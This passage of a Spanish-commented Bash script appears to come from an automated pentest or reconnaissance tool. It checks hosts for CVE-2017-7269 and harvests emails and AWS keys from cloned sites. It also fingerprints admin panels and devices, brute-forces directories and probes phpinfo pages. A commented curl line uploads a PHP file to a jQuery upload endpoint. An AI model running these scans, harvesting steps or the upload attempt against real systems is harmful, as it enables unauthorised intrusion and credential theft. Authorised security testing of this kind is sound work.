			if [[ $greprc -eq 0  ]];then 															
				explodingcan-checker.py -t $proto_http://$host:$port> logs/vulnerabilidades/"$host"_"$port"_CVE-2017-7269.txt &
			fi
			# https://www.exploit-db.com/exploits/41992/								
		fi		
	done #for hosts		
done # for web.txt
########

if [ "$MODE" == "total" ] && [ ! -z $DOMINIO ] ; then
	echo -e "[+] Extraer metadatos de sitios clonados (DOMINIO= $DOMINIO)"	
	exiftool archivos/$DOMINIO/ > logs/enumeracion/"$DOMINIO"_metadata_exiftool.txt
	egrep -i "Author|creator|modified" logs/enumeracion/"$DOMINIO"_metadata_exiftool.txt | cut -d ":" -f2 | egrep -iv "tool|adobe|microsoft|PaperStream|Acrobat|JasperReports|Mozilla" |sort |uniq  > .enumeracion/"$DOMINIO"_metadata_exiftool.txt

	##### Reporte metadatos (sitio web) ##
	# sed 's/ /-/g' -i .enumeracion/"$DOMINIO"_metadata_exiftool.txt # cambiar espacios por "-"
	# echo "Nombre;Apellido;Correo;Cargo" > reportes/correos_metadata.csv
	# for nombretotal in `more .enumeracion/"$DOMINIO"_metadata_exiftool.txt 2>/dev/null`; do	
	# #echo "nombretotal $nombretotal"
	# 	if [[ ${nombretotal} == *"-"*  ]];then 			
	# 		nombre=`echo $nombretotal | cut -f1 -d "-"`
	# 		apellido=`echo $nombretotal | cut -f2 -d "-"`
	# 		echo "$nombre;$apellido;$apellido@$DOMINIO;n/a" > reportes/correos_metadata.csv 
	# 	fi
	# done
	################

	#  Eliminar URLs repetidas (clonacion)
	echo -e "[+] Eliminar URLs repetidas (Extraidos de la clonacion)"										
	sort logs/enumeracion/"$DOMINIO"_web_wget2.txt 2>/dev/null | uniq > .enumeracion/"$DOMINIO"_web_wgetURLs.txt
	

	# filtrar error de conexion a base de datos y otros errores
	egrep -ira --color=never "mysql_query| mysql_fetch_array|access denied for user|mysqli|Undefined index" webClone/$DOMINIO/* 2>/dev/null| sed 's/webClone\///g' >> .enumeracion/"$DOMINIO"_web_errores.txt

	# correos presentes en los sitios web
	grep -Eirao "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" webClone/$DOMINIO/* | cut -d ":" -f2 | egrep --color=never $"com|net|org|bo|es" | grep $DOMINIO |  sort |uniq  >> logs/enumeracion/"$DOMINIO"_web_correos.txt
	cat  logs/enumeracion/"$DOMINIO"_web_correos.txt .enumeracion2/*_recon_correos.txt 2>/dev/null | grep "$DOMINIO" | sed 's/x22//' |  sed 's/x2//' |  sort |uniq  > .enumeracion/"$DOMINIO"_consolidado_correos.txt

	egrep -ira --color=never "aws_access_key_id|aws_secret_access_key" webClone/$DOMINIO/* > .vulnerabilidades/"$DOMINIO"_aws_secrets.txt 

	#echo -e "[+] Buscar datos sensible en archivos clonados"	
	#echo "cd webClone/$DOMINIO"
	#cd webClone/$DOMINIO
		#rm checksumsEscaneados.txt # tiene hashes md5 
		# Creando repositorio temporal para que pueda ser escaneado por las herramientas

		# cat scripts.js | js-beautify  | tee scripts.js

		# rm -rf .git 2>/dev/null
		# git init >/dev/null 2>/dev/null
		# git add . >/dev/null 2>/dev/null
		# git commit -m "test" >/dev/null 2>/dev/null

		# # llaves SSH
		# echo -e "\nllaves SSH" >> ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 
		# docker run -v `pwd`:/files -it dumpster-diver -p files --min-key 70 --max-key 72 --entropy 5.1  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >>  ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 

		# # AWS Secret Access Key
		# echo -e "\nAWS Secret Access Key" >> ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 
		# docker run -v `pwd`:/files -it dumpster-diver -p files --min-key 40 --max-key 40 --entropy 4.3   | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >>  ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 

		# # Azure Shared Key
		# echo -e "\nAzure Shared Key" >> ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 
		# docker run -v `pwd`:/files -it dumpster-diver -p files --min-key 66 --max-key 66 --entropy 5.1  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >>  ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 

		# # RSA private key 
		# echo -e "\n RSA private key " >> ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 
		# docker run -v `pwd`:/files -it dumpster-diver -p files --min-key 76 --max-key 76 --entropy 5.1  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >>  ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 

		# # passwords 
		# echo -e "\n passwords " >> ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 
		# docker run -v "$(pwd):/files" -it dumpster-diver -p files --min-pass 9 --max-pass 15 --pass-complex 8  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >>  ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 


		# # generic token - dumpster-diver
		# echo -e "\n generic token (dumpster-diver)" >> ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 
		# docker run -v "$(pwd):/files" -it dumpster-diver -p files --min-key 25 --max-key 40 --entropy 4.6  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >> ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 

		# generic token - truffle
		#docker run --rm -v "$(pwd):/project" trufflehog  --rules /etc/truffle-rules.json  --exclude_paths  /etc/truffle-exclude.txt --regex --json file:///project  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" > ../logs/vulnerabilidades/"$DOMINIO"_trufflehog_secrets.txt

	#cd ../../

	#grep "found" logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt > .vulnerabilidades/"$DOMINIO"_web_secrets.txt 
	#grep "found" logs/vulnerabilidades/"$DOMINIO"_trufflehog_secrets.txt >> .vulnerabilidades/"$DOMINIO"_web_secrets.txt 	
	###################
fi

####Parse 2
pwd
grep SUCCEED logs/vulnerabilidades/"$host"_"$port"_webdav.txt > .vulnerabilidades/"$host"_"$port"_webdav.txt 2>/dev/null
grep -i 'vulnerable' logs/vulnerabilidades/"$host"_"$port"_CVE-2017-7269.txt  2>/dev/null |  sed -r "s/\x1B\[(([0-9]+)(;[0-9]+)*)?[m,K,H,f,J]//g" > .vulnerabilidades/"$host"_"$port"_CVE-2017-7269.txt
######



##### Identificar paneles administrativos #####
echo " ##### Identificar paneles administrativos ##### "
touch .enumeracion/canary_webData.txt # para que grep no falle cuando solo hay un archivo
fingerprint=''
list_admin=`egrep -ira "inicia|Nextcloud|User Portal|keycloak|inicio|kiosko|login|Quasar App|controlpanel|cpanel|whm|webmail|phpmyadmin|Web Management|Office|intranet|InicioSesion|S.R.L.|SRL|Outlook|Zimbra Web Client|Sign In|PLATAFORMA|Iniciar sesion|Sistema|Usuarios|Grafana|Ingrese" .enumeracion/*webData.txt 2>/dev/null| egrep -vi "Fortinet|Cisco|RouterOS|Juniper|TOTVS|xxxxxx|Mini web server|SonicWALL|Check Point|sameHOST|OpenPhpMyAdmin|hikvision" | sort | cut -d ":" -f1 |  cut -d "/" -f2| cut -d "_" -f1-2` #acreditacion.sucre.bo_80
	for line in $(echo $list_admin); do 			
		if [ "$VERBOSE" == 's' ]; then  echo "line $line" ; fi
		host=`echo $line | cut -d "_" -f 1` # 190.129.69.107:80
		port=`echo $line | cut -d "_" -f 2`
		fingerprint1=`echo $line | cut -d ":" -f 2`
		if [[ ${port} == *"443"* || ${port} == *"9091"*  ]]; then
			proto_http="https"
		else
			proto_http="http"
		fi
		url="$proto_http://$host:$port/"
		
		if [[ ${fingerprint} == *"$fingerprint1"* ]]; then
			echo "Mismo servicio corriendo "
		else
			if [ "$VERBOSE" == 's' ]; then  echo "url $url" ; fi
			echo $url >> servicios/admin-web.txt
		fi	
		fingerprint=$fingerprint1		
	done
############

insert_data


######### find services ###
cd .enumeracion2/
	touch canary.txt # es necesario que exista al menos 2 archivos 
	echo '' > canary_cert.txt 

	grep --color=never -i "Dahua" *webData.txt | cut -d '_' -f1-2 | tr '_' ':' >> ../servicios/dahua-web.txt
	grep --color=never -i "Dell iDRAC" *webData.txt | cut -d '_' -f1-2 | tr '_' ':' >> ../servicios/idrac.txt
	grep --color=never -i "WebLogic Server" *webData.txt | cut -d '_' -f1-2 | tr '_' ':' >> ../servicios/WebLogic.txt
	grep --color=never -i "Grafana" *webData.txt | cut -d '_' -f1-2 | tr '_' ':' >> ../servicios/Grafana.txt
	grep --color=never -i "Fortinet" *webData.txt | cut -d '_' -f1-2 | tr '_' ':' >> ../servicios/fortinet.txt
	grep --color=never -i "hikvision" *webData.txt | cut -d '_' -f1-2 | tr '_' ':' >> ../servicios/hikvision.txt
	grep --color=never -i "optical network terminal" *webData.txt | cut -d '_' -f1-2 | tr '_' ':' >> ../servicios/HUAWEI-AR.txt		

	grep --color=never -i "ONT-4G" *webData.txt | cut -d '_' -f1-2 | tr '_' ':' > ../servicios/ZTE-ONT-4G.txt
	grep --color=never -i "ONT1GE3FE2P1TVSWZ" *webData.txt | cut -d '_' -f1-2 | tr '_' ':' >> ../servicios/ZTE-ONT-4G.txt
	grep --color=never -i "ZTE corp " *webData.txt | grep 'F6' | grep 'ZTE-2017' | cut -d '_' -f1-2 | tr '_' ':' > ../servicios/ZTE-F6XX-2017.txt
	grep --color=never -i "ZTE corp " *webData.txt | grep 'F6' | grep 'ZTE-2018' | cut -d '_' -f1-2 | tr '_' ':' > ../servicios/ZTE-F6XX-2018.txt

	grep --color=never -i ciscoASA *webData.txt | cut -d '_' -f1-2 | tr '_' ':' >> ../servicios/ciscoASA.txt
	grep --color=never -i "Cisco Router" *webData.txt | cut -d '_' -f1-2 | tr '_' ':' >> ../servicios/ciscoRouter.txt
	
	#phpmyadmin, etc
	#responde con 401
	grep --color=never -i admin * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback|whois|google|webData|Usando archivo" | grep 401 | awk '{print $2}' | sort | uniq -i | uniq >> ../servicios/web401.txt
	
	#responde con 200 OK
	cat *_webadmin.txt 2>/dev/null | grep 200 | awk '{print $2}' | sort | uniq -i | uniq >> ../servicios/admin-web.txt
	
	#tomcat
	grep --color=never -i "/manager/html" * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback|whois|google|ajp13Info" | awk '{print $2}' | sort | uniq -i | uniq >> ../servicios/admin-web.txt
	# 

	#Fortigate
	grep --color=never -i "fortigate" *_cert.txt 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback|whois|google" | cut -d "_" -f1-2 | tr '_' ':' | uniq >> ../servicios/fortigate.txt
	
	#3com
	grep --color=never -i 3com * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" | egrep --color=never "^1" | cut -d "_" -f1 | uniq >> ../servicios/3com2.txt
	sort ../servicios/3com2.txt | uniq > ../servicios/3com.txt
	rm ../servicios/3com2.txt
	
	#d-link
	grep --color=never -i d-link * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" | egrep --color=never "^1" | cut -d "_" -f1 | uniq >> ../servicios/d-link2.txt
	sort ../servicios/d-link2.txt | uniq > ../servicios/d-link.txt
	rm ../servicios/d-link2.txt

	#linksys
	grep --color=never -i linksys * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" | egrep --color=never "^1" | cut -d "_" -f1 | uniq >> ../servicios/linksys2.txt
	sort ../servicios/linksys2.txt | uniq > ../servicios/linksys.txt
	rm ../servicios/linksys2.txt
			
	#Pentahoo	
	# Pentaho User Console - Login~~~~ ~~~/pentaho~~~login~ Apache-Coyote/1.1
	grep --color=never -i pentaho * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" > ../servicios/pentaho.txt
	
	#Dahua Camera
	grep --color=never -i "Dahua Camera" * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" > ../servicios/dahua_camara.txt
	
	#ubiquiti
	grep --color=never -i ubiquiti * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/ubiquiti2.txt	
	sort ../servicios/ubiquiti2.txt | uniq > ../servicios/ubiquiti.txt ; rm ../servicios/ubiquiti2.txt
	
	#pfsense
	grep --color=never -i pfsense * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/pfsense.txt
	
	#PRTG
	grep --color=never -i PRTG * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/PRTG.txt
	
	#ZKsoftware
	grep --color=never -i 'ZK ' * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback"| sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/ZKSoftware.txt

	#HIKVISION
	grep --color=never -i 'doc/page/login.asp' * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback"| sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/hikvision.txt

	#vCenter
	grep --color=never -i "ID_VC_Welcome" * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback"| sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/vCenter.txt
		
	#Cisco
	grep --color=never -i cisco * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" |  cut -d "_" -f1 | uniq >> ../servicios/cisco.txt
		
	#zimbra
	grep --color=never -i zimbra * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback"| sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/zimbra.txt
	
	#jboss
	grep --color=never -i jboss * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/jboss.txt

	#F5
	grep --color=never -i 'F5 Networks' * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|users|crawler|crawled|wayback" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/f5.txt
	
	#401
		#line = http://200.87.193.109:80/phpmyadmin/	
	grep --color=never -i Unauthorized * 2>/dev/null| grep --color=never http | cut -d "_" -f1 > ../servicios/web401-2.txt
		#line=10.0.0.2:443
	grep --color=never -i Unauthorized * 2>/dev/null | cut -d "_" -f1-2 | uniq | tr "_" ":"   > ../servicios/web401-2.txt
	# sort
	sort ../servicios/web401-2.txt | uniq | uniq >> ../servicios/web401.txt
	rm ../servicios/web401-2.txt
	
cd ..
################################



#################### Realizar escaneo de directorios (2do nivel) a los directorios descubiertos ######################
if [[ "$PROXYCHAINS" == "n" && "$INTERNET" == 'n' ]]; then 		
	echo -e "$OKBLUE #################### Realizar escaneo de directorios (2do nivel) a los directorios descubiertos ######################$RESET"
	cat .enumeracion2/*webdirectorios.txt | egrep -v '401|403' | uniq > logs/enumeracion/webdirectorios_uniq.txt
	while IFS= read -r line
	do		
		echo -e "\n\t########### $line #######"										
		#line= 200	https://inscripcion.notariadoplurinacional.gob.bo:443/manual/ (Listado directorio activo)	 ,
		while true; do
			free_ram=`free -m | grep -i mem | awk '{print $7}'`		
			script_instancias=$((`ps aux | grep perl | wc -l` - 1)) 		
			if [[ $free_ram -gt $MIN_RAM  && $script_instancias -lt $MAX_SCRIPT_INSTANCES  ]]
			then
				if [[ ${line} != *"Listado directorio"*  &&  ${line} != *"wp-"* &&  ${line} != *".action"* &&  ${line} != *"index"*  ]] ; then
					proto=`echo $line | cut -d ":" -f 1 | cut -d ' ' -f2` #  http/https
					host_port=`echo $line | cut -d "/" -f 3` # 190.129.69.107:80							
					host=`echo $host_port | cut -d ":" -f 1` #puede ser subdominio tb
					port=`echo $host_port | cut -d ":" -f 2`		
					path_web=`echo $line | cut -d "/" -f4 | tr '[:upper:]' '[:lower:]'` #minuscula
				
					if [[ ${path_web} != *"."* && ${path_web} != *"manual"* && ${path_web} != *"dashboard"* && ${path_web} != *"docs"* && ${path_web} != *"license"* && ${path_web} != *"wp"* && ${path_web} != *"aspnet_client"*  && ${path_web} != *"autodiscover"*  && ${path_web} != *"manager/html"* && ${path_web} != *"manual"* && ${path_web} != *"manual"*  ]];then   # si es un directorio (no un archivo) y el listado de directorios no esta habilitado

						egrep -i "drupal|wordpress|joomla|moodle" .enumeracion/"$host"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|Always200-OK|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs"
						greprc=$?						
						if [[ $greprc -eq 1 ]]; then	
							waitWeb 2.5
							echo -e "\t\t[+] Enumerando directorios de 2do nivel ($path_web)" 
							web-buster.pl -r 0 -t $host -p $port -s $proto -h $hilos_web -d "/$path_web/" -m folders >> logs/enumeracion/"$host"_"$port"_webdirectorios2.txt &

							web-buster.pl -r 0 -t $host -p $port -s $proto -h $hilos_web -d "/$path_web/" -m archivosPeligrosos -o 0 | egrep --color=never "^200" >> .vulnerabilidades/"$host"_"$port"_archivosPeligrosos.txt &
						fi		
						
						#TODO
						#curl -F "files=@/usr/share/lanscanner/info.php" http://10.11.1.123/books/apps/jquery-file-upload/server/php/index.php > logs/vulnerabilidades/"$ip"_"$port"_jqueryUpload.txt
						#grep "info.php" logs/vulnerabilidades/"$ip"_"$port"_jqueryUpload.txt > .vulnerabilidades/"$ip"_"$port"_jqueryUpload.txt		
					else
						echo -e "\t[-] No vale la pena escanear este directorio "
					fi				
					sleep 1
				else
					echo -e "\t[-] El listado de directorios esta activo o es un directorio de wordpress "
				fi #revisar q el listado de directorio esta habilitado
				
				break		
			else				
				script_instancias=`ps aux | grep perl | wc -l`
				echo -e "\t[-] Maximo número de instancias de perl ($script_instancias) RAM = $free_ram Mb"
				sleep 3									
			fi	
		done #while				
	done < logs/enumeracion/webdirectorios_uniq.txt
		
fi  

# revisar si hay scripts ejecutandose
while true; do
	webbuster_instancias=`ps aux | egrep 'wampServer|joomscan|wpscan|buster' | wc -l`		
	if [ "$webbuster_instancias" -gt 1 ]
	then
		echo -e "\t[i] Todavia hay scripts activos ($webbuster_instancias)"				
		sleep 10
	else
		break		
	fi
done	# done true	
########################


##########  filtrar los directorios de segundo nivel que respondieron 200 OK (llevarlos a .enumeracion) ################
touch logs/enumeracion/canary_webdirectorios2.txt # se necesita al menos 2 archivos *_webdirectorios2.txt
echo -e "[i] Revisar vulnerabilidades relacionadas a aplicaciones web (directorios de segundo nivel)"
egrep --color=never "^200" logs/enumeracion/*webdirectorios2.txt 2>/dev/null| while read -r line ; do	
	#line = 200	http://sigec.ruralytierras.gob.bo:80/login/index/
	#echo -e  "$OKRED[!] Listado de directorio detectado $RESET"		
	archivo_origen=`echo $line | cut -d ':' -f1`
	contenido=`echo $line | cut -d ':' -f2-6`    
	#echo "archivo_origen $archivo_origen"
	archivo_destino=$archivo_origen       
	archivo_destino=${archivo_destino/logs\/enumeracion/.enumeracion}   	    
	#200	http://192.168.50.154:80/img/ (Listado directorio activo)	 TRACE
	#echo "contenido $contenido"
	echo $contenido >> $archivo_destino        
done
insert_data


############ vulnerabilidades relacionados a servidores/aplicaciones web ########
echo -e "[i] Revisar vulnerabilidades relacionadas a aplicaciones web"	
#Vulnerabilidades detectada en la raiz del servidor
echo -e "[i] Revisar vulnerabilidades detectadas en la raiz del servidor"
egrep "vulnerabilidad=" .enumeracion2/*webData.txt 2>/dev/null| while read -r line ; do	
	echo -e  "$OKRED[!] Vulnerabilidad detectada $RESET"			
	#line = .enumeracion2/170.239.123.50_80_webData.txt:Control de Usuarios ~ Apache/2.4.12 (Win32) OpenSSL/1.0.1l PHP/5.6.8~200 OK~~http://170.239.123.50/login/~|301 Moved~ PHP/5.6.8~vulnerabilidad=MensajeError~^
	archivo_origen=`echo $line | cut -d ':' -f1` #.enumeracion2/192.168.0.36_8080_webData.txt
	url_vulnerabilidad=`echo $archivo_origen | cut -d "/" -f 2 | cut -d "_" -f1-2 | tr "_" ":"` #192.168.0.36:8080

	if [[ ${url_vulnerabilidad} == *"443"* || ${url_vulnerabilidad} == *"9091"*  ]]; then
		url_vulnerabilidad="https://$url_vulnerabilidad" #http://192.168.0.36:8080
	else
		url_vulnerabilidad="http://$url_vulnerabilidad"
	fi		
	
	vulnerabilidad=`echo $line | cut -d '~' -f7 | sed 's/vulnerabilidad=//' ` #OpenPhpMyAdmin	
	
	archivo_destino=$archivo_origen       
	archivo_destino=${archivo_destino/.enumeracion2/.vulnerabilidades}   	
	archivo_destino=${archivo_destino/webdirectorios/$vulnerabilidad}   	
	archivo_destino=${archivo_destino/webarchivos/$vulnerabilidad}
	archivo_destino=${archivo_destino/admin/$vulnerabilidad}   	
	archivo_destino=${archivo_destino/webData/$vulnerabilidad} 

	if [ $vulnerabilidad == 'ListadoDirectorios' ];then				
		if [ "$VERBOSE" == 's' ]; then  echo -e "[+] ListadoDirectorios"  ; fi
		contenido=`listDir -url=$url_vulnerabilidad`		
	fi
		
	if [[ $vulnerabilidad == 'OpenPhpMyAdmin' || $vulnerabilidad == 'debugHabilitado' || $vulnerabilidad == 'OpenMikrotik' || $vulnerabilidad == 'divulgacionInformacion' ]];then	
		if [ "$VERBOSE" == 's' ]; then  echo -e "[+] $vulnerabilidad \n"  ; fi
		contenido=$url_vulnerabilidad
	fi


	if [ $vulnerabilidad == 'MensajeError' ];then	
		if [ "$VERBOSE" == 's' ]; then  echo -e "[+] MensajeError \n"  ; fi		
		contenido=`curl --max-time 10 -k  $url_vulnerabilidad | grep -v "langconfig" | egrep "undefined function|Fatal error|Uncaught exception|No such file or directory|Lost connection to MySQL|mysql_select_db|ERROR DE CONSULTA|no se pudo conectar al servidor|Fatal error:|Uncaught Error:|Stack trace|Exception information" -m1 -b10 -A10`
	fi

	if [[ $vulnerabilidad == 'phpinfo' ]];then	
		if [ "$VERBOSE" == 's' ]; then echo -e "[+] Posible archivo PhpInfo ($url_vulnerabilidad)"   ; fi
		echo "archivo_origen $archivo_origen"
		archivo_phpinfo=`echo "$archivo_origen" | sed 's/webData/phpinfo/'|sed 's/.enumeracion2\///'`
		#archivo_phpinfo = 127.0.0.1_80_phpinfo.txt.
		phpinfo.pl -url "\"$url_vulnerabilidad\"" >> logs/vulnerabilidades/$archivo_phpinfo 2>/dev/null				
		egrep -iq "USERNAME|COMPUTERNAME|ADDR|HOST" logs/vulnerabilidades/$archivo_phpinfo
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then													
			echo -e  "$OKRED[!] Es un archivo phpinfo valido ! $RESET"
			echo "URL  $url_vulnerabilidad" >> .vulnerabilidades/$archivo_phpinfo
			echo ""  >> .vulnerabilidades/$archivo_phpinfo
			grep ':' logs/vulnerabilidades/$archivo_phpinfo >> .vulnerabilidades/$archivo_phpinfo
			echo -e "\n\n"  >> .vulnerabilidades/$archivo_phpinfo
		else
			echo -e "[i] No es un archivo phpinfo valido"
		fi	#archivo phpinfo
	fi
	echo "archivo_destino $archivo_destino"
	echo $contenido >> $archivo_destino
done

##Vulnerabilidades detectadas con web fuzzing
echo -e "[i] Revisar vulnerabilidades detectadas mediante navegacion forzada"
egrep -ira "vulnerabilidad=" logs |grep -i '200    ' 2>/dev/null| while read -r line ; do	
	echo -e  "$OKRED[!] Vulnerabilidad detectada $RESET"		
	#line= logs/vulnerabilidades/127.0.0.1_80_divulgacionInformacion.txt:200       http://127.0.0.1/phpinfo.php (vulnerabilidad=phpinfo)
	echo "$line"
	archivo_origen=`echo $line | cut -d ':' -f1 | cut -d "/" -f3`  # 127.0.0.1_80_divulgacionInformacion.txt
	echo "archivo_origen $archivo_origen"
	url_vulnerabilidad=`echo $line | awk '{print $2}'` # http://127.0.0.1/phpinfo.php 
	vulnerabilidad=`echo $line | awk '{print $3}'| cut -d '=' -f2 | tr -d ')'` #OpenPhpMyAdmin	
	echo "vulnerabilidad $vulnerabilidad"

	archivo_destino=".vulnerabilidades/$archivo_origen"
	echo "archivo_destino $archivo_destino"

	if [ $vulnerabilidad == 'ListadoDirectorios' ];then				
		if [ "$VERBOSE" == 's' ]; then  echo -e "[+] ListadoDirectorios"  ; fi		
		contenido=`listDir -url=$url_vulnerabilidad`
		echo "$contenido\n" >> $archivo_destino		
	fi
		
	if [[ $vulnerabilidad == 'OpenPhpMyAdmin' || $vulnerabilidad == 'debugHabilitado' || $vulnerabilidad == 'OpenMikrotik' ]];then	
		if [ "$VERBOSE" == 's' ]; then  echo -e "[+] $vulnerabilidad \n"  ; fi
		contenido=$url_vulnerabilidad
		echo $contenido >> $archivo_destino
	fi

	if [[ $vulnerabilidad == 'divulgacionInformacion' || $vulnerabilidad == 'phpinfo' ]];then	
		if [ "$VERBOSE" == 's' ]; then  echo -e "[+] $vulnerabilidad \n"  ; fi

		if [[ ${url_vulnerabilidad} == *"error"* || ${url_vulnerabilidad} == *"log"* || ${url_vulnerabilidad} == *"dwsync"*  ]];then  			
			echo -e  "$OKRED[!] Archivo de error o log detectado! ($url_vulnerabilidad) $RESET"			
			contenido==$url_vulnerabilidad

		else
			echo -e "[+] Posible archivo PhpInfo ($url_vulnerabilidad)" 
			archivo_phpinfo=`echo "$archivo_origen" | sed 's/divulgacionInformacion/phpinfo/'`
			#archivo_phpinfo = 127.0.0.1_80_phpinfo.txt.
			phpinfo.pl -url "\"$url_vulnerabilidad\"" >> logs/vulnerabilidades/$archivo_phpinfo 2>/dev/null				
			egrep -iq "USERNAME|COMPUTERNAME|ADDR|HOST" logs/vulnerabilidades/$archivo_phpinfo
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then													
				echo -e  "$OKRED[!] Es un archivo phpinfo valido ! $RESET"
				echo "URL  $url_vulnerabilidad" >> .vulnerabilidades/$archivo_phpinfo
				echo ""  >> .vulnerabilidades/$archivo_phpinfo
				grep ':' logs/vulnerabilidades/$archivo_phpinfo >> .vulnerabilidades/$archivo_phpinfo
				echo -e "\n\n"  >> .vulnerabilidades/$archivo_phpinfo
			else
				echo -e "[i] No es un archivo phpinfo valido"
			fi	#archivo phpinfo
		fi	
	fi


	if [ $vulnerabilidad == 'MensajeError' ];then	
		if [ "$VERBOSE" == 's' ]; then  echo -e "[+] MensajeError \n"  ; fi		
		contenido=`curl --max-time 10 -k  $url_vulnerabilidad | grep -v "langconfig" | egrep "undefined function|Fatal error|Uncaught exception|No such file or directory|Lost connection to MySQL|mysql_select_db|ERROR DE CONSULTA|no se pudo conectar al servidor|Fatal error:|Uncaught Error:|Stack trace|Exception information" -m1 -b10 -A10`
		archivo_phpinfo=`echo "$archivo_destino" | sed 's/archivosDefecto/MensajeError/'`
		archivo_phpinfo=${archivo_phpinfo/webarchivos/MensajeError}   
		archivo_phpinfo=${archivo_phpinfo/webdirectorios/MensajeError} 
		archivo_phpinfo=${archivo_phpinfo/webadmin/MensajeError} 

		echo $contenido >> $archivo_phpinfo		
	fi
	
	echo -e "\n"
done
# insertar datos 
insert_data
#################################



	
if [ -f servicios/admin-web.txt ]
then	
	#https://sucre.bo/mysql/
	echo -e "$OKBLUE [i] Identificando paneles de administracion $RESET"
	while IFS= read -r url
	do				
		echo -e "\n\t########### $url  #######"
		####### Identificar tipo de panel de admin				
		host_port=`echo $url | cut -d "/" -f 3` # 190.129.69.107:80
		proto_http=`echo $url | cut -d ":" -f 1`
		if [[ ${host_port} == *":"* ]]; then
			port=`echo $host_port | cut -d ":" -f 2`	
		else
			if [[  ${proto_http} == *"https"* ]]; then
				port="443"
			else
				port="80"
			fi
		fi
		host=`echo $host_port | cut -d ":" -f 1`				
